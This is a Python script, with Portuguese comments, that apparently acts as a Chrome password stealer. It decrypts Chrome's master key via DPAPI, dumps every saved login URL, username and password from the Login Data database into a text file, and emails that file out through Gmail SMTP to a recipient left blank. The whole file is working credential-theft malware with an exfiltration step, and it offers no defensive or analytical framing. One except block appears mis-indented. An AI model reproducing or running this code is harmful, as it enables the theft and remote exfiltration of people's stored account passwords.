import os
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

def get_master_key():
	with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r") as f:
		local_state = f.read()
		local_state = json.loads(local_state)
	master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
	master_key = master_key[5:]  # removing DPAPI
	master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
	return master_key

def decrypt_payload(cipher, payload):
	return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
	return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(buff, master_key):
	try:
		iv = buff[3:15]
		payload = buff[15:]
		cipher = generate_cipher(master_key, iv)
		decrypted_pass = decrypt_payload(cipher, payload)
		decrypted_pass = decrypted_pass[:-16].decode()  # remove suffix bytes
		return decrypted_pass
	except Exception as e:
		 # print("AI TU TOMOU NO TOBA SALVARAM A SENHA EM UMA VERSAO \n")
		 # print(str(e))
		 print("Provavelmente a senha foi salva em uma versão anterior a do chrome 80")
		return "Chrome < 80"
 
def submitMessage(caminho,body = "\nCorpo da mensagem"):
	fromaddr = ""
	toaddr = ''
	msg = MIMEMultipart()

	msg['From'] = fromaddr 
	msg['To'] = toaddr
	msg['Subject'] = "Titulo do e-mail"
	msg.attach(MIMEText(body, 'plain'))

		# filename = 'teste.pdf'

	attachment = open(caminho,'rb')


	part = MIMEBase('application', 'octet-stream')
	part.set_payload((attachment).read())
	encoders.encode_base64(part)
	part.add_header('Content-Disposition', "attachment; filename= %s" % caminho)

	msg.attach(part)

	attachment.close()

	server = smtplib.SMTP('smtp.gmail.com', 587)
	server.starttls()
	server.login(fromaddr, "")
	text = msg.as_string()
	server.sendmail(fromaddr, toaddr, text)
	server.quit()
   

  



master_key = get_master_key()
login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Login Data'
shutil.copy2(login_db, "Loginvault.db") #making a temp copy since Login Data DB is locked while Chrome is running
conn = sqlite3.connect("Loginvault.db")
cursor = conn.cursor()
array = []
caminho_txt = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\browserPasswords.txt'
chromePasswords = open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\browserPasswords.txt', 'w')
try:
	cursor.execute("SELECT action_url, username_value, password_value FROM logins")
	for r in cursor.fetchall():
		url = r[0]
		username = r[1]
		encrypted_password = r[2]
		decrypted_password = decrypt_password(encrypted_password, master_key)
		if len(username) > 0:
			# print("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n")
			chromePasswords.writelines("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n")
		   

except Exception as e:
	pass
cursor.close()
conn.close()
try:
	os.remove("Loginvault.db")
except Exception as e:
	pass


chromePasswords.close()
submitMessage(caminho_txt,"Assunto")
